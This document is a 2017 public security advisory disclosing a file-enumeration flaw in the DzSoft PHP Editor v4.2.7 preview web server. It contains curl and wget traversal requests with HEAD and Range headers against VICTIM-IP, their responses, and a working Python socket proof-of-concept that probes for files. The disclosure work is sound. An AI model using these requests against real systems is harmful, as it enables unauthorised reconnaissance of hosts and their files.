@@ -1,0 +1,264 @@
+[+] Credits: John Page AKA hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/DZSOFT-v4.2.7-PHP-EDITOR-FILE-ENUMERATION.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+==============
+www.dzsoft.com
+
+
+
+Product:
+=========================
+DzSoft PHP Editor v4.2.7
+
+DzSoft PHP Editor is a tool for writing and testing PHP and HTML pages.
+
+
+
+Vulnerability Type:
+====================
+File Enumeration
+
+
+
+
+CVE Reference:
+==============
+N/A
+
+ 
+
+Security Issue:
+================
+DzSoft comes with a built-in web server used to preview PHP files, the built-in web server is prone to file enumeration
+attacks when combining "HEAD" method HTTP requests with directory traversal "\../../" type attacks. This can aid attackers
+in information gathering (File enumeration) to help in possibly furthering attacks.
+
+On install DzSoft users get Windows network warning like:
+
+"Allow Dzsoft to communicate on these networks:"
+
+Private networks, such as my home or work network
+
+Public networks, such as those in airports and coffee shops (not recommended).
+
+This selection will create Firewall rule and determine remote connections allowed to DzSoft editors built-in server.
+Then when remote user make HTTP request to DzSoft they will get HTTP 403 Forbidden from the built-in web server. 
+
+e.g.
+
+curl  -v "http://VICTIM-IP/\../mysql/data/mysql.pid"
+
+
+< HTTP/1.1 403 Forbidden
+< Content-Type: text/html
+< Content-Length: 1554
+<
+<HTML>
+<HEAD>
+  <TITLE>403 Forbidden</TITLE>
+</HEAD>
+<BODY>
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<!-- ---------------------------------------------------------------------------------------------------- -->
+<H1>Forbidden</H1>
+<p>For security reasons, you cannot access the built-in web server of DzSoft PHP Editor from another computer.</p>
+<p>If you see this message within DzSoft PHP Editor's window, or if you think that there might be reasons to enable access from other computers,
+</BODY>
+</HTML>
+* Connection #0 to host x.x.x.x left intact
+
+
+
+However, this 403 Forbidden access control can be bypassed by malicious users to "stat" files in and outside the webroot.
+
+e.g. mysql directory.
+
+File enumeration Conditions: 
+
+These setting is found under Run / Run Options / Paramaters tab
+
+a) DZSoft built-in web server is running 
+b) DZSoft built-in web servers "REMOTE_HOST=x.x.x.x" and "REMOTE_ADDR=x.x.x.x" is set to a real IP other than localhost.
+
+For POC create and save a PHP file under XAMPP/htdocs and run DzSoft built-in web server in preview mode.
+
+Next make request for "mysql/my-huge.ini" to see if exists.
+
+
+C:\>curl  -v -I "http://VICTIM-IP/\../mysql/my-huge.ini"
+*   Trying VICTIM-IP...
+* Connected to VICTIM-IP (VICTIM-IP) port 80 (#0)
+> HEAD /\../mysql/my-huge.ini HTTP/1.1
+> User-Agent: curl/7.41.0
+> Host: VICTIM-IP
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+< Content-Type:
+Content-Type:
+< Content-Length: 5057
+Content-Length: 5057
+< Cache-Control: no-cache
+Cache-Control: no-cache
+
+
+Checking for "mysql.pid"
+/////////////////////////
+
+
+C:\>curl  -v -I "http://VICTIM-IP/\../mysql/data/mysql.pid"
+*   Trying VICTIM-IP...
+* Connected to VICTIM-IP (VICTIM-IP) port 80 (#0)
+> HEAD /\../mysql/data/mysql.pid HTTP/1.1
+> User-Agent: curl/7.41.0
+> Host: VICTIM-IP
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+< Content-Type:
+Content-Type:
+< Content-Length: 5
+Content-Length: 5
+< Cache-Control: no-cache
+Cache-Control: no-cache
+< Expires: 0
+
+
+Checking for "xampp_shell.bat"
+///////////////////////////////
+
+C:\>curl  -v -I "http://VICTIM-IP/\../xampp_shell.bat"
+*   Trying VICTIM-IP...
+* Connected to VICTIM-IP (VICTIM-IP) port 80 (#0)
+> HEAD /\../xampp_shell.bat HTTP/1.1
+> User-Agent: curl/7.41.0
+> Host: VICTIM-IP
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+< Content-Type:
+Content-Type:
+< Content-Length: 1084
+Content-Length: 1084
+< Cache-Control: no-cache
+
+
+These also work...
+
+
+[root@localhost local]# wget -S --spider  "http://VICTIM-IP:8080/\../mysql/my-huge.ini"
+--10:26:21--  http://VICTIM-IP:8080/%5C../mysql/my-huge.ini
+Connecting to VICTIM-IP:8080... connected.
+HTTP request sent, awaiting response... 
+  HTTP/1.0 200 OK
+  Content-Type: 
+  Content-Length: 5057
+  Cache-Control: no-cache
+  Expires: 0
+Length: 5057 (4.9K) []
+200 OK
+
+
+[root@localhost local]# wget -S --spider  "http://VICTIM-IP:8080/\../mysql/my-innodb-heavy-4G.ini"
+--10:29:03--  http://VICTIM-IP:8080/%5C../mysql/my-innodb-heavy-4G.ini
+Connecting to VICTIM-IP:8080... connected.
+HTTP request sent, awaiting response... 
+  HTTP/1.0 200 OK
+  Content-Type: 
+  Content-Length: 20906
+  Cache-Control: no-cache
+  Expires: 0
+Length: 20906 (20K) []
+200 OK
+
+
+Tested Windows XAMPP, Linux / curl
+curl 7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5
+
+
+//////////////////////////////////////////
+
+Next, target files on C:\ Drive.
+
+Bypass 401 Forbidden to enumerate a file on C:\ drive named "hi.txt"
+wget "http://127.0.0.1:8088/c/hi.txt"  -c --header="Range: bytes=0"
+
+
+
+Exploit/POC:
+=============
+In DZSoft PHP Editor
+
+1) Change DzSoft web server options for remote address to IP other than localhost.
+2) Create test PHP file deploy under xampp/htdocs or whatever Apache your using.
+3) Start DzSofts built-in webserver to preview PHP file 
+
+Then,
+
+
+import socket
+
+print 'DzSoft File Enumeration POC'
+print 'Hyp3rlinx / ApparitionSec'
+
+IP=raw_input("[IP]>")
+PORT=int(raw_input("[PORT]>"))
+DEPTH=int(raw_input("[DEPTH]>"))
+FILE=raw_input("[FILE]>")
+ENUM="HEAD "+"/\\"
+ENUM+="../"*DEPTH+FILE+ " HTTP/1.0\r\n\r\n"
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((IP,PORT))
+s.send(ENUM)
+print 'Enumerating file:'
+print ENUM
+output = s.recv(128)
+print output
+s.close()
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+==================================
+Vendor Notification: No reply
+March 27, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
